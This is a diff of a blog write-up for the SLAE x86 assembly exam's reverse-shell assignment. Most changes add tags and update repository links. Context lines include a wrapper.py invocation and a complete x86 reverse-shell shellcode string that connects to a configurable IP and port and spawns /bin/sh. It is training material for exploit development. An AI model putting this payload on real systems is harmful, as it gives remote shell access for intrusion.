@@ -8,10 +8,13 @@ categories:
   - blog
 tags:
   - slae
+  - x86
+  - shellcode
   - assembly
   - nasm
   - c
   - exam
+  - python
 ---
 
 ## Disclaimer
@@ -30,14 +33,14 @@ The IP address and the TCP port number should be easily configurable.
 
 ## Source Code
 
-The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_2).
+The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2).
 
 List of files:
 
-- [tcp_rev_shell.c](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_2/tcp_rev_shell.c): Reverse Shell written in `C`
-- [tcp_rev_shell.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_2/tcp_rev_shell.nasm): Reverse Shell written in `Assembly`
-- [automation/wrapper.py](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_2/automation/wrapper.py): `python` script to automate the generation of shellcode based on arbitrary IP addresses and TCP port
-- [automation/template.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_2/automation/template.nasm): generic template used by `wrapper.py`
+- [tcp_rev_shell.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.c): Reverse Shell written in `C`
+- [tcp_rev_shell.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.nasm): Reverse Shell written in `Assembly`
+- [automation/wrapper.py](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/wrapper.py): `python` script to automate the generation of shellcode based on arbitrary IP addresses and TCP port
+- [automation/template.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/template.nasm): generic template used by `wrapper.py`
 
 ## Implementation
 
@@ -450,7 +453,7 @@ python3 wrapper.py -p 1234 -ip "127.0.0.1" -t ./template.nasm -o /tmp/output.nas
 # "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\xbb\xa0\xdf\xdf\xde\x81\xf3\xdf\xdf\xdf\xdf\x53\x31\xdb\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
 ```
 
-The python script and the `NASM` template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder [/code/assignment_2/automation](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_2/automation).
+The python script and the `NASM` template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder [assignment/2/automation](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2/automation).
 
 ## Testing
 
